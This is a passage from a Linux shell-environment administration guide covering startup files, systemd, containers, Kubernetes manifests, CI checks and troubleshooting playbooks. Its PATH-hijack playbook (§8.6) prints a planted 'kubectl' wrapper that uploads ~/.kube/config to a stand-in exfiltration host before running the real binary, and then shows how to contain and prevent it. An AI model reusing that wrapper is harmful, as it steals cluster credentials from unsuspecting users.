HOME=/var/lib/platform-exporter
INVOCATION_ID=8f2c1d4a9b6e4f0e8d1c2b3a4e5f6071
JOURNAL_STREAM=8:41922
LANG=en_US.UTF-8
LOGNAME=svc-exporter
NOTIFY_SOCKET=/run/systemd/notify
PATH=/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PLATFORM_ENV=production
PLATFORM_LOG_LEVEL=info
PLATFORM_REGION=eu-central-1
PLATFORM_SCRAPE_INTERVAL=30s
PLATFORM_TENANT=acme-prod
USER=svc-exporter
```

Fleet-wide defaults, if you must:

```bash
$ sudo mkdir -p /etc/systemd/system.conf.d
$ sudo tee /etc/systemd/system.conf.d/10-platform-env.conf >/dev/null <<'EOF'
[Manager]
DefaultEnvironment=PLATFORM_REGION=eu-central-1 PLATFORM_ENV=production
EOF
$ sudo systemctl daemon-reexec
$ systemctl show-environment
LANG=en_US.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PLATFORM_ENV=production
PLATFORM_REGION=eu-central-1
```

### 7.4 Containers and Kubernetes — where every startup file disappears

A container `ENTRYPOINT` is `execve`'d directly by the runtime. There is no login, no PAM, no `/etc/profile`. Anything you put in `/etc/profile.d` inside an image is dead code unless something invokes a login shell.

`Dockerfile`:

```dockerfile
FROM debian:12-slim

# Image-level environment: this becomes the container's environ at exec time.
# It reaches EVERY process in the container, shell or not. This is the
# container equivalent of /etc/environment.
ENV LANG=C.UTF-8 \
    LC_ALL=C.UTF-8 \
    PATH=/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \
    PLATFORM_ENV=production \
    DEBIAN_FRONTEND=noninteractive

RUN apt-get update \
 && apt-get install -y --no-install-recommends bash ca-certificates curl jq less procps \
 && rm -rf /var/lib/apt/lists/*

COPY --chmod=0755 toolchain/ /opt/toolchain/bin/

# Interactive niceties for `kubectl exec -it ... -- bash`.
# kubectl exec starts an interactive NON-LOGIN shell: it reads ~/.bashrc,
# NOT /etc/profile. Put operator ergonomics in the bashrc path.
COPY --chmod=0644 container/bashrc /etc/bash.bashrc
COPY --chmod=0644 container/bashrc /root/.bashrc

# Login-shell files, for entrypoints that explicitly use `bash -lc`.
COPY --chmod=0644 container/profile.d/ /etc/profile.d/

RUN useradd --system --uid 65532 --gid 0 --home-dir /home/nonroot \
        --create-home --shell /usr/sbin/nologin nonroot \
 && cp /etc/bash.bashrc /home/nonroot/.bashrc \
 && chown -R 65532:0 /home/nonroot && chmod -R g=u /home/nonroot

USER 65532:0
WORKDIR /home/nonroot

# exec form: NO shell is involved, so $VARS are not expanded here and no
# startup file is read. The ENV above is the entire environment.
ENTRYPOINT ["/opt/toolchain/bin/platform-exporter"]
CMD ["--listen=0.0.0.0:9101"]
```

`k8s/toolbox.yaml` — a complete, valid manifest set demonstrating all three environment channels:

```yaml
---
apiVersion: v1
kind: Namespace
metadata:
  name: platform-tools
  labels:
    pod-security.kubernetes.io/enforce: baseline
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: shell-profile
  namespace: platform-tools
  labels:
    app.kubernetes.io/name: toolbox
    app.kubernetes.io/component: shell-environment
data:
  # Mounted at /etc/profile.d/ — only executed when something runs `bash -l`.
  10-platform-path.sh: |
    # POSIX sh: also read by dash-based images.
    path_prepend() {
        [ -d "$1" ] || return 0
        case ":${PATH}:" in *":$1:"*) return 0 ;; esac
        PATH="$1${PATH:+:$PATH}"
    }
    path_prepend /opt/toolchain/bin
    path_prepend /usr/local/bin
    export PATH
    unset -f path_prepend

  20-platform-exports.sh: |
    KUBE_EDITOR=vim;   export KUBE_EDITOR
    PAGER=less;        export PAGER
    LESS="-R -F -X -i"; export LESS

  # Mounted at /etc/bash.bashrc — read by `kubectl exec -it -- bash`
  # (interactive, non-login). This is the file operators actually feel.
  bashrc: |
    case $- in *i*) ;; *) return ;; esac
    HISTFILE=/dev/null            # ephemeral pod: do not pretend to persist history
    HISTCONTROL=ignoreboth
    shopt -s checkwinsize globstar
    PS1='\[\e[1;35m\]toolbox\[\e[0m\]:\[\e[1;34m\]\w\[\e[0m\]$ '
    PS4='+ ${BASH_SOURCE[0]:-main}:${LINENO}: '
    alias k=kubectl
    alias ll='ls -lah --color=auto'
    alias grep='grep --color=auto'
    kns() { kubectl config set-context --current --namespace="${1:?usage: kns <ns>}"; }
    kctx() { kubectl config use-context "${1:?usage: kctx <context>}"; }
    printf 'toolbox %s on %s — namespace %s\n' \
        "${TOOLBOX_VERSION:-dev}" "${NODE_NAME:-?}" "${POD_NAMESPACE:-?}"
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: platform-env
  namespace: platform-tools
data:
  PLATFORM_ENV: production
  PLATFORM_REGION: eu-central-1
  TOOLBOX_VERSION: "2026.08.3"
---
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: toolbox
  namespace: platform-tools
  labels:
    app.kubernetes.io/name: toolbox
spec:
  selector:
    matchLabels:
      app.kubernetes.io/name: toolbox
  template:
    metadata:
      labels:
        app.kubernetes.io/name: toolbox
    spec:
      terminationGracePeriodSeconds: 5
      securityContext:
        runAsNonRoot: true
        runAsUser: 65532
        runAsGroup: 0
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: toolbox
          image: registry.example.com/platform/toolbox:2026.08.3
          imagePullPolicy: IfNotPresent

          # CHANNEL 1 — container environment. Reaches every process,
          # shell or not. This is the only channel a non-shell ENTRYPOINT sees.
          envFrom:
            - configMapRef:
                name: platform-env
          env:
            - name: NODE_NAME
              valueFrom:
                fieldRef:
                  fieldPath: spec.nodeName
            - name: POD_NAMESPACE
              valueFrom:
                fieldRef:
                  fieldPath: metadata.namespace
            - name: HOME
              value: /home/nonroot

          # CHANNEL 2 — login-shell files. Only effective because the
          # command below is an explicit LOGIN shell (`bash -l`).
          # CHANNEL 3 — /etc/bash.bashrc, for `kubectl exec -it -- bash`.
          command: ["/bin/bash", "-l", "-c"]
          args:
            - |
              set -Eeuo pipefail
              printf 'toolbox up on %s, PATH=%s\n' "${NODE_NAME}" "${PATH}"
              command -v kubectl >/dev/null || { echo "kubectl missing from login PATH" >&2; exit 1; }
              exec sleep infinity

          volumeMounts:
            - name: shell-profile
              mountPath: /etc/profile.d/10-platform-path.sh
              subPath: 10-platform-path.sh
              readOnly: true
            - name: shell-profile
              mountPath: /etc/profile.d/20-platform-exports.sh
              subPath: 20-platform-exports.sh
              readOnly: true
            - name: shell-profile
              mountPath: /etc/bash.bashrc
              subPath: bashrc
              readOnly: true

          resources:
            requests: { cpu: "10m", memory: "32Mi" }
            limits:   { cpu: "200m", memory: "256Mi" }

          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop: ["ALL"]

      volumes:
        - name: shell-profile
          configMap:
            name: shell-profile
            defaultMode: 0444
      tolerations:
        - operator: Exists
```

Prove each channel independently:

```bash
$ kubectl apply -f k8s/toolbox.yaml
namespace/platform-tools created
configmap/shell-profile created
configmap/platform-env created
daemonset.apps/toolbox created

$ kubectl -n platform-tools rollout status ds/toolbox
daemon set "toolbox" successfully rolled out

$ kubectl -n platform-tools logs ds/toolbox | head -1
toolbox up on worker-03, PATH=/opt/toolchain/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin:/usr/bin:/sbin:/bin

# Channel 1: container env — present regardless of shell type
$ kubectl -n platform-tools exec ds/toolbox -- printenv PLATFORM_REGION
eu-central-1

# Non-interactive, non-login: reads NOTHING. profile.d never runs.
$ kubectl -n platform-tools exec ds/toolbox -- bash -c 'type kns 2>&1; echo "PATH=$PATH"'
bash: line 1: type: kns: not found
PATH=/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Explicit login shell: profile.d runs
$ kubectl -n platform-tools exec ds/toolbox -- bash -lc 'printenv KUBE_EDITOR'
vim

# Interactive: /etc/bash.bashrc runs, aliases and functions appear
$ kubectl -n platform-tools exec -it ds/toolbox -- bash
toolbox 2026.08.3 on worker-03 — namespace platform-tools
toolbox:/home/nonroot$ type kns
kns is a function
kns () 
{ 
    kubectl config set-context --current --namespace="${1:?usage: kns <ns>}"
}
toolbox:/home/nonroot$ exit
```

The third and fourth commands are the entire lesson of §2 in a container: same image, same node, different shell type, different environment.

### 7.5 CI validation — treat shell config as code

`.github/workflows/shell-env.yml`:

```yaml
---
name: shell-environment
on:
  push:
    paths:
      - 'roles/shell_environment/**'
      - 'k8s/toolbox.yaml'
      - '.github/workflows/shell-env.yml'
  pull_request:

jobs:
  lint:
    name: Lint shell startup files
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4

      - name: Install linters
        run: |
          sudo apt-get update
          sudo apt-get install -y --no-install-recommends shellcheck dash bats

      - name: POSIX syntax check for /etc/profile.d snippets
        run: |
          set -euo pipefail
          fail=0
          for f in roles/shell_environment/files/profile.d/*.sh; do
            if ! dash -n "$f"; then
              echo "::error file=$f::not POSIX sh — /etc/profile is read by dash on Debian"
              fail=1
            fi
          done
          exit "$fail"

      - name: ShellCheck the skeleton and library (bash dialect)
        run: |
          shellcheck --shell=bash --severity=style \
            roles/shell_environment/files/skel/.bashrc \
            roles/shell_environment/files/skel/.bash_profile \
            roles/shell_environment/files/sre.sh

      - name: ShellCheck the POSIX files
        run: |
          shellcheck --shell=sh --severity=style \
            roles/shell_environment/files/skel/.profile \
            roles/shell_environment/files/profile.d/*.sh

      - name: Assert .bashrc has an interactivity guard in its first 10 lines
        run: |
          set -euo pipefail
          head -10 roles/shell_environment/files/skel/.bashrc \
            | grep -qE 'case \$- in|\[\[ \$- ' \
            || { echo "::error::.bashrc must return early when non-interactive"; exit 1; }

      - name: Assert .bashrc is silent when non-interactive
        run: |
          set -euo pipefail
          out=$(HOME=$PWD bash --rcfile roles/shell_environment/files/skel/.bashrc \
                  -c 'true' 2>&1 || true)
          if [ -n "$out" ]; then
            echo "::error::.bashrc wrote to stdout/stderr non-interactively: $out"
            exit 1
          fi

      - name: Assert PATH mutation is idempotent
        run: |
          set -euo pipefail
          before=$(sh -c '. roles/shell_environment/files/profile.d/10-platform-path.sh; echo "$PATH"')
          after=$(sh -c '. roles/shell_environment/files/profile.d/10-platform-path.sh
                         . roles/shell_environment/files/profile.d/10-platform-path.sh
                         . roles/shell_environment/files/profile.d/10-platform-path.sh
                         echo "$PATH"')
          [ "$before" = "$after" ] || {
            echo "::error::PATH grew on repeated sourcing"
            printf 'before: %s\nafter:  %s\n' "$before" "$after"
            exit 1
          }

      - name: bats unit tests for shell functions
        run: bats roles/shell_environment/tests/
```

`roles/shell_environment/tests/functions.bats`:

```bash
#!/usr/bin/env bats

setup() {
    # shellcheck source=../files/sre.sh
    source "${BATS_TEST_DIRNAME}/../files/sre.sh"
}

@test "path_prepend adds a directory exactly once" {
    source "${BATS_TEST_DIRNAME}/../files/profile.d/10-platform-path.sh" || true
    PATH="/usr/bin:/bin"
    mkdir -p "${BATS_TMPDIR}/tool"
    path_prepend() { case ":${PATH}:" in *":$1:"*) return 0;; esac; PATH="$1:$PATH"; }
    path_prepend "${BATS_TMPDIR}/tool"
    path_prepend "${BATS_TMPDIR}/tool"
    run awk -v RS=: -v d="${BATS_TMPDIR}/tool" 'END{}$0==d{n++}END{print n+0}' <<<"$PATH"
    [ "$output" -eq 1 ]
}

@test "p_ctx returns a dash when no kubeconfig context exists" {
    KUBECONFIG=/nonexistent run p_ctx
    [ "$status" -eq 0 ]
    [ "$output" = "-" ]
}
```

---

## 8. Verification and failure diagnosis

### 8.1 The trace harness — see exactly which files a shell reads

`bash -x` from the very first instruction, with a `PS4` that names the file:

```bash
$ PS4='+ ${BASH_SOURCE[0]:-main}:${LINENO}: ' bash -lixc 'true' 2>&1 | grep -E '^\+ /' | head -20
+ /etc/profile:3: PS1='\h:\w\$ '
+ /etc/profile:7: [ -d /etc/profile.d ]
+ /etc/profile:8: for i in /etc/profile.d/*.sh
+ /etc/profile.d/10-platform-path.sh:5: path_prepend /opt/toolchain/bin
+ /etc/profile.d/10-platform-path.sh:20: export PATH
+ /etc/profile.d/20-platform-exports.sh:2: PLATFORM_REGION=eu-central-1
+ /etc/profile.d/50-platform-lib.sh:4: case himBHs in
+ /etc/profile.d/50-platform-lib.sh:12: . /usr/local/lib/platform/sre.sh
+ /etc/profile.d/90-platform-interactive.sh:6: umask 0027
+ /etc/profile.d/90-platform-interactive.sh:9: TMOUT=900
+ /home/sre/.bash_profile:12: export PATH
+ /home/sre/.bash_profile:24: . /home/sre/.bashrc
+ /home/sre/.bashrc:8: HISTCONTROL=ignoreboth:erasedups
+ /home/sre/.bashrc:33: PS1='\[\e[1;32m\]\u@\h\[\e[0m\]:\[\e[1;34m\]\w\[\e[0m\]\$ '
```

Trace only the file *openings*, including the ones that fail — this is the definitive answer to "which profile file is my system actually using":

```bash
$ strace -f -e trace=openat -o /tmp/startup.trace bash -lic 'exit' >/dev/null 2>&1
$ grep -E '(profile|bashrc|bash_login|bash_logout|environment)' /tmp/startup.trace
openat(AT_FDCWD, "/etc/profile", O_RDONLY)                = 3
openat(AT_FDCWD, "/etc/profile.d/10-platform-path.sh", O_RDONLY) = 3
openat(AT_FDCWD, "/etc/profile.d/20-platform-exports.sh", O_RDONLY) = 3
openat(AT_FDCWD, "/etc/profile.d/50-platform-lib.sh", O_RDONLY) = 3
openat(AT_FDCWD, "/etc/profile.d/90-platform-interactive.sh", O_RDONLY) = 3
openat(AT_FDCWD, "/etc/bash.bashrc", O_RDONLY)            = 3
openat(AT_FDCWD, "/home/sre/.bash_profile", O_RDONLY)     = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/home/sre/.bash_login", O_RDONLY)       = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/home/sre/.profile", O_RDONLY)          = 3
openat(AT_FDCWD, "/home/sre/.bashrc", O_RDONLY)           = 3
openat(AT_FDCWD, "/home/sre/.bash_logout", O_RDONLY)      = 3
```

The three consecutive lines for `.bash_profile` → `.bash_login` → `.profile` **are** the precedence rule of §2.2, observed rather than recited. Two `ENOENT`s and one success: the chain stopped at the first readable file.

Timing the startup cost — an overloaded prompt is a real latency bug:

```bash
$ time bash -lic 'exit'
real	0m0.412s
user	0m0.221s
sys	0m0.108s

$ time bash --noprofile --norc -c 'exit'
real	0m0.004s
user	0m0.001s
sys	0m0.003s
```

400 ms per shell, multiplied by every `ssh` in every Ansible run, is the difference between a 3-minute and a 20-minute playbook.

### 8.2 Differential diagnosis: diff the environments

The fastest route from "works here, not there" to a root cause:

```bash
$ diff <(ssh sre@node01 'printenv | sort') \
       <(ssh sre@node01 'bash -lc "printenv | sort"')
2a3
> JAVA_HOME=/usr/lib/jvm/java-21-openjdk-amd64
5c6
< PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
---
> PATH=/home/sre/.local/bin:/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
8a10
> PLATFORM_REGION=eu-central-1
```

Read: the non-login SSH command misses `JAVA_HOME`, the toolchain `PATH` and `PLATFORM_REGION`, because `/etc/profile.d` never ran. Two acceptable fixes, in order of preference:

1. Move the variables to `/etc/environment` (reaches every PAM session, including cron), **or**
2. Make the caller use `bash -lc` — but this only helps callers you control.

Capturing cron's environment, which nothing else reproduces faithfully:

```bash
$ ( crontab -l 2>/dev/null; echo '* * * * * /usr/bin/env > /tmp/cron.env 2>&1' ) | crontab -
$ sleep 65
$ sort /tmp/cron.env
HOME=/home/sre
LANG=en_US.UTF-8
LOGNAME=sre
PATH=/usr/bin:/bin
PWD=/home/sre
SHELL=/bin/sh
USER=sre

$ diff <(sort /tmp/cron.env) <(ssh sre@localhost 'bash -lc "env"' | sort) | grep '^>' | cut -c3-
JAVA_HOME=/usr/lib/jvm/java-21-openjdk-amd64
PATH=/home/sre/.local/bin:/opt/toolchain/bin:/usr/local/sbin:...
PLATFORM_REGION=eu-central-1
...
$ crontab -l | grep -v '/tmp/cron.env' | crontab -    # clean up
```

Note `LANG` survived into cron (via `pam_env` reading `/etc/environment`) while `PATH` from `profile.d` did not. That asymmetry is the practical reason `/etc/environment` exists.

### 8.3 Symptom → cause → probe → remediation

| Symptom | Most likely cause | Probe | Remediation |
|---|---|---|---|
| `command not found` in cron, works in terminal | `profile.d` not read; `PATH=/usr/bin:/bin` | `* * * * * env > /tmp/c.env` | Absolute paths in the job, or `PATH=` line at the top of the crontab |
| Aliases missing after console login, present in `tmux` | `~/.bash_profile` exists and lacks the `~/.bashrc` hook | `strace -e openat bash -lic exit` | Add `[ -f ~/.bashrc ] && . ~/.bashrc` to `~/.bash_profile` |
| `~/.profile` edits have no effect | `~/.bash_profile` or `~/.bash_login` shadows it | `ls -la ~/.bash_profile ~/.bash_login ~/.profile` | Consolidate into one file |
| `scp`/`rsync`/`sftp`: `protocol error` / `unexpected tag` | `~/.bashrc` writes to stdout | `ssh host true \| wc -c` → must print `0` | Move output below the `case $- in *i*` guard |
| `sudo cmd` cannot find a tool the user can run | `secure_path` overrides `PATH` | `sudo printenv PATH; sudo -l` | Drop-in extending `secure_path`; never disable `env_reset` |
| Upgraded binary still runs the old version | Bash hash table | `type -a cmd; hash` | `hash -r`; enable `shopt -s checkhash` |
| `systemd` service: variable unset, works by hand | No shell → no startup files | `systemctl show -p Environment unit` | `Environment=` / `EnvironmentFile=` |
| New users get config, existing users do not | `/etc/skel` applies at creation only | `cmp ~user/.bashrc /etc/skel/.bashrc` | Move policy to `/etc/profile.d` |
| Login errors: `[[: not found`, `Syntax error: "(" unexpected` | Bashism in `/etc/profile.d/*.sh`, read by dash | `sh -n /etc/profile.d/*.sh` | Rewrite POSIX, or guard with `[ -n "$BASH_VERSION" ]` |
| Session dies after 15 min | `TMOUT` set read-only | `declare -p TMOUT` | Adjust policy centrally; `sshd` `ClientAliveInterval` is the real control |
| `PATH` is 900 characters after nesting shells | Unconditional append in `~/.bashrc` | `awk -v RS=: 'END{print NR}' <<<"$PATH"` | `path_prepend` guard; put `PATH` in `~/.bash_profile`, not `~/.bashrc` |
| Sort order differs between laptop and CI | `LANG`/`LC_COLLATE` imported via `SendEnv`/`AcceptEnv` | `ssh host locale` | `export LC_ALL=C` at the top of every parsing script |
| `su user` lacks the environment; `su - user` has it | Non-login vs login | `su -c 'shopt -q login_shell; echo $?' user` | Use `su -` / `sudo -i` |
| Function undefined in a script that "worked interactively" | Functions are not inherited unless exported/sourced | `type -t fn` inside the script | Source the library explicitly in the script |
| Container: `/etc/profile.d` ignored | `ENTRYPOINT` execs directly | `kubectl exec pod -- printenv PATH` | Use image `ENV`, or `bash -lc` in `command` |

### 8.4 Worked playbook A — the corrupted `scp` transfer

```bash
$ scp backup.tar.gz sre@node07:/srv/backups/
protocol error: filename does not match request

$ ssh sre@node07 true | wc -c
28

$ ssh sre@node07 true
Welcome to node07 — prod cluster

$ ssh sre@node07 'grep -n "Welcome" ~/.bashrc'
3:echo "Welcome to $(hostname) — prod cluster"
5:case $- in *i*) ;; *) return ;; esac
```

The guard exists but sits **after** the `echo`. Order is the bug:

```bash
$ ssh sre@node07 'sed -i "3d" ~/.bashrc && sed -i "2a echo \"Welcome to \$(hostname) — prod cluster\"" ~/.bashrc'
$ ssh sre@node07 'head -4 ~/.bashrc'
# ~/.bashrc
case $- in *i*) ;; *) return ;; esac
echo "Welcome to $(hostname) — prod cluster"

$ ssh sre@node07 true | wc -c
0
$ scp backup.tar.gz sre@node07:/srv/backups/
backup.tar.gz                              100%  482MB  118.4MB/s   00:04
```

**Invariant to enforce in CI:** `ssh host true | wc -c` must be `0`. It is a one-line test, and it catches an entire class of outage.

### 8.5 Worked playbook B — cron finds nothing

```bash
$ grep CRON /var/log/syslog | tail -2
Aug 26 03:17:01 node01 CRON[41123]: (sre) CMD (backup-run --profile nightly)
Aug 26 03:17:01 node01 CRON[41122]: (CRON) info (No MTA installed, discarding output)

$ sudo -u sre env -i HOME=/home/sre SHELL=/bin/sh PATH=/usr/bin:/bin \
    /bin/sh -c 'backup-run --profile nightly'
/bin/sh: 1: backup-run: not found

$ command -v backup-run
/opt/toolchain/bin/backup-run
```

Reproduce, don't theorise: `env -i` with exactly cron's variables makes the failure deterministic. Three remediations, ranked:

```bash
# 1. Best: absolute path. Zero environment dependency.
$ crontab -l
17 3 * * * /opt/toolchain/bin/backup-run --profile nightly

# 2. Acceptable: declare PATH in the crontab itself (crontab(5) supports assignments)
$ crontab -l
PATH=/opt/toolchain/bin:/usr/local/bin:/usr/bin:/bin
MAILTO=sre-oncall@example.com
17 3 * * * backup-run --profile nightly

# 3. Fleet-wide: put it in /etc/environment, which pam_env exposes to cron
$ grep ^PATH /etc/environment
PATH="/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```

Never `SHELL=/bin/bash` + `bash -lc` in a crontab as the primary fix: it makes a scheduled job depend on a user's dotfiles, which is exactly the coupling you are trying to remove. Prefer a `systemd` timer with an explicit `Environment=`.

### 8.6 Worked playbook C — the `PATH` hijack

```bash
$ ls -l /opt/vendor/bin/
total 12
-rwxrwxr-x 1 root developers 8192 Aug 24 14:02 vendorctl
-rwxrwxr-x 1 mallory developers  61 Aug 26 02:11 kubectl

$ cat /opt/vendor/bin/kubectl
#!/bin/sh
curl -s https://exfil.example/`base64 -w0 ~/.kube/config` >/dev/null
exec /usr/bin/kubectl "$@"

$ echo "$PATH"
/opt/vendor/bin:/usr/local/bin:/usr/bin:/bin
$ type -a kubectl
kubectl is /opt/vendor/bin/kubectl
kubectl is /usr/bin/kubectl
```

A group-writable directory placed **before** the system directories is a full command-substitution primitive. Containment:

```bash
$ sudo chmod g-w /opt/vendor/bin
$ sudo rm -f /opt/vendor/bin/kubectl
$ hash -r
$ type kubectl
kubectl is /usr/bin/kubectl

# Prevention: system directories first, vendor last, and audit the mode.
$ sudo tee /etc/profile.d/10-platform-path.sh >/dev/null <<'EOF'
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
for d in /opt/toolchain/bin /opt/vendor/bin; do
    [ -d "$d" ] || continue
    case "$(stat -c %A "$d")" in
        *w*w*|*w*t*) continue ;;      # refuse group/other-writable entries
    esac
    PATH="${PATH}:${d}"
done
export PATH
unset d
EOF
```

Design rules that fall out of this: **never put a writable directory ahead of `/usr/bin`; never put `.` or an empty field in `PATH` at all; keep `secure_path` narrow.**

### 8.7 Worked playbook D — the shadowed skeleton

```bash
$ ssh bob@node01 'command -v platformctl || echo MISSING'
MISSING
$ ssh alice@node01 'command -v platformctl || echo MISSING'
/opt/toolchain/bin/platformctl

$ ssh bob@node01 'ls -la ~/.bash_profile ~/.bash_login ~/.profile 2>&1'
-rw-r--r-- 1 bob bob   58 Feb  3  2024 /home/bob/.bash_profile
ls: cannot access '/home/bob/.bash_login': No such file or directory
-rw-r--r-- 1 bob bob  807 Feb  3  2024 /home/bob/.profile

$ ssh bob@node01 'cat ~/.bash_profile'
PATH=/usr/local/bin:/usr/bin:/bin
export PATH

$ ssh bob@node01 'PS4="+ \${BASH_SOURCE[0]}:\${LINENO}: " bash -lxc true 2>&1 | tail -3'
+ /home/bob/.bash_profile:1: PATH=/usr/local/bin:/usr/bin:/bin
+ /home/bob/.bash_profile:2: export PATH
+ /home/bob/.bashrc: not sourced
```

Two independent defects: `~/.bash_profile` **overwrites** `PATH` instead of extending it (discarding everything `/etc/profile.d` contributed), and it never sources `~/.bashrc`. Fix in place, preserving the user's intent:

```bash
$ ssh bob@node01 'cat > ~/.bash_profile' <<'EOF'
# Extend PATH, never replace it: /etc/profile.d has already run.
case ":${PATH}:" in
    *":${HOME}/.local/bin:"*) ;;
    *) PATH="${HOME}/.local/bin${PATH:+:${PATH}}" ;;
esac
export PATH
[ -n "${BASH_VERSION-}" ] && [ -f "$HOME/.bashrc" ] && . "$HOME/.bashrc"
EOF
$ ssh bob@node01 'bash -lc "command -v platformctl"'
/opt/toolchain/bin/platformctl
```

### 8.8 A verification script you can ship

```bash
#!/usr/bin/env bash
# /opt/toolchain/bin/verify-shell-env — assert the shell environment contract.
# Exit 0 = all invariants hold. Exit 1 = at least one violated.
set -uo pipefail

fail=0
check() {
    local desc="$1"; shift
    if "$@" >/dev/null 2>&1; then
        printf '  \033[32mPASS\033[0m  %s\n' "$desc"
    else
        printf '  \033[31mFAIL\033[0m  %s\n' "$desc"
        fail=1
    fi
}

printf '== profile.d is POSIX-clean ==\n'
for f in /etc/profile.d/*.sh; do
    check "sh -n $f" sh -n "$f"
done

printf '== PATH hygiene ==\n'
check "no empty field in PATH"  bash -c '[[ ":$PATH:" != *"::"* && "$PATH" != :* && "$PATH" != *: ]]'
check "no '.' in PATH"          bash -c '[[ ":$PATH:" != *":.:"* ]]'
check "no duplicate entries"    bash -c \
    'n=$(tr : "\n" <<<"$PATH" | grep -c .); u=$(tr : "\n" <<<"$PATH" | sort -u | grep -c .); [ "$n" -eq "$u" ]'

printf '== no writable directory in PATH ==\n'
IFS=: read -ra _p <<<"$PATH"
for d in "${_p[@]}"; do
    [ -d "$d" ] || continue
    check "not group/other writable: $d" bash -c \
        'case "$(stat -c %A "$1")" in *w*w*|*w*t*) exit 1;; esac' _ "$d"
done

printf '== login shell resolves the toolchain ==\n'
check "platformctl on login PATH" bash -lc 'command -v platformctl'
check "PLATFORM_REGION exported"  bash -lc '[ -n "${PLATFORM_REGION:-}" ]'

printf '== non-interactive shells are silent ==\n'
check "bash -c produces no output" bash -c '[ -z "$(bash -c true 2>&1)" ]'

printf '== skeleton is syntactically valid ==\n'
for f in /etc/skel/.bashrc /etc/skel/.bash_profile; do
    [ -f "$f" ] && check "bash -n $f" bash -n "$f"
done
[ -f /etc/skel/.profile ] && check "sh -n /etc/skel/.profile" sh -n /etc/skel/.profile

printf '== sudo secure_path is set ==\n'
check "secure_path defined" bash -c 'sudo -n grep -qr secure_path /etc/sudoers /etc/sudoers.d'

exit "$fail"
```

```bash
$ verify-shell-env
== profile.d is POSIX-clean ==
  PASS  sh -n /etc/profile.d/10-platform-path.sh
  PASS  sh -n /etc/profile.d/20-platform-exports.sh
  PASS  sh -n /etc/profile.d/50-platform-lib.sh
  PASS  sh -n /etc/profile.d/90-platform-interactive.sh
== PATH hygiene ==
  PASS  no empty field in PATH
  PASS  no '.' in PATH
  PASS  no duplicate entries
== no writable directory in PATH ==
  PASS  not group/other writable: /opt/toolchain/bin
  PASS  not group/other writable: /usr/local/sbin
  PASS  not group/other writable: /usr/local/bin
  PASS  not group/other writable: /usr/sbin
  PASS  not group/other writable: /usr/bin
  PASS  not group/other writable: /sbin
  PASS  not group/other writable: /bin
== login shell resolves the toolchain ==
  PASS  platformctl on login PATH
  PASS  PLATFORM_REGION exported
== non-interactive shells are silent ==
  PASS  bash -c produces no output
== skeleton is syntactically valid ==
  PASS  bash -n /etc/skel/.bashrc
  PASS  bash -n /etc/skel/.bash_profile
  PASS  sh -n /etc/skel/.profile
== sudo secure_path is set ==
  PASS  secure_path defined
$ echo $?
0
```

---

## 9. Command reference and exam traps

### 9.1 The commands you must be able to produce from memory

```bash
# Shell type
shopt -q login_shell ; echo $-
# Variables
export VAR=value        declare -x VAR=value      export -p
unset VAR               export -n VAR             readonly VAR
set                     set -o                    shopt
env                     printenv VAR              declare -p VAR
env -i CMD              env -u VAR CMD            VAR=x CMD
set -a ; . file ; set +a
# PATH
PATH="$PATH:/new"; export PATH
hash            hash -r            hash -d cmd
type -a cmd     type -t cmd        type -P cmd     which cmd
# Functions and aliases
name() { commands; }        function name { commands; }
declare -f name             declare -F              unset -f name
export -f name              local var               return N
alias a='cmd'   alias   unalias a   unalias -a
command cmd     builtin cmd         enable -n cmd
# Sourcing
. ./file        source ./file
# Skeleton
useradd -m -k /etc/skel -s /bin/bash user
grep SKEL /etc/default/useradd /etc/adduser.conf
# Lists
a ; b     a && b     a || b     a & b     (a)     { a; }     ! a
```

### 9.2 Traps that appear on the exam and in production

| Statement | Verdict | Why |
|---|---|---|
| "A login shell reads `~/.bashrc`." | **False** | Only via an explicit hook in `~/.bash_profile`/`~/.profile`. |
| "If `~/.bash_profile` and `~/.profile` both exist, both are read." | **False** | The first readable file in the order `~/.bash_profile`, `~/.bash_login`, `~/.profile` wins; the rest are skipped. |
| "`source` and `.` differ." | **False** | `source` is a bash synonym for POSIX `.`. Both run in the *current* shell. |
| "`./script.sh` and `. script.sh` are equivalent." | **False** | `./script.sh` forks a child; `.` runs in the current shell and its variable/`cd` changes persist. |
| "`export` creates a variable." | **False** | It sets the export attribute on an existing or newly assigned variable. |
| "`env` shows all shell variables." | **False** | Only exported ones. Use `set` or `declare -p`. |
| "Aliases work in scripts." | **False** | Disabled in non-interactive shells unless `shopt -s expand_aliases`, and expanded at parse time. |
| "`a && b \|\| c` is if/else." | **False** | If `b` fails, `c` also runs. |
| "Editing `/etc/skel` updates existing users." | **False** | Copied at account creation only. |
| "`~/.bash_logout` always runs when the shell exits." | **False** | Only for interactive *login* shells. Not for `ssh host cmd`, cron, or `systemd`. |
| "A non-interactive shell reads nothing." | **Almost** | `$BASH_ENV` is consulted, and `sshd`-spawned bash reads `~/.bashrc`. |
| "`PATH=/usr/bin:` is the same as `PATH=/usr/bin`." | **False** | The trailing empty field means the current directory. |
| "A pipeline's exit status is the first failure." | **False** | It is the *last* command's status, unless `set -o pipefail`. |
| "`local v=$(cmd)` propagates `cmd`'s failure." | **False** | The status is `local`'s, always `0`. Split the declaration. |

---

## Referencias

**Certification objectives**

